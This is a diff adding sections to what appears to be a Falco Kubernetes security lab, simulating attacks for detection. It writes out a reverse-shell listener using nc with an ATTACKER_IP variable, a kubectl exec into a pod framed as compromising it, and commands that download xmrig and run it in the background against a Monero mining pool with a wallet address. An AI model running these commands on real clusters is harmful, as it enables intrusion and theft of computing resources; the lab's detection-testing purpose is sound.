@@ -321,3 +321,48 @@ kubectl logs -n falco -l app.kubernetes.io/name=falco \
 ```
 
 Defaulted container "falco" out of: falco, falco-driver-loader (init)
+
+## Random Reverse Shell
+
+Use the terminal in the left to launch the attack. <br/>
+From here, retrieve the IP of the machine. <br/>
+It will be required to connect to the reserve shell running in the attacker machine:
+
+```
+ATTACKER_IP=$(ip route get 1 |awk '{print $7}')
+echo $ATTACKER_IP
+```
+
+Copy the value for later use. <br/>
+After this, launch a reverse shell listening on port 4242 with:
+
+```
+nc -nlvp 4242
+```
+
+## Cryptojacking
+
+Exec into a running pod (compromise the pod):
+```
+kubectl exec -ti -n falco                falco-falcosidekick-bc4487d46-lf25l -- sh
+```
+
+And finally, download, untar, and install and run the cryptominer:
+
+```
+curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
+```
+
+```
+tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
+```
+
+```
+cd xmrig-6.16.4
+```
+
+```
+./xmrig --donate-level 8 -o xmr-us-east1.nanopool.org:14433 -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero --background
+```
+
+Now the cryptominer process is running in the k8s cluster!
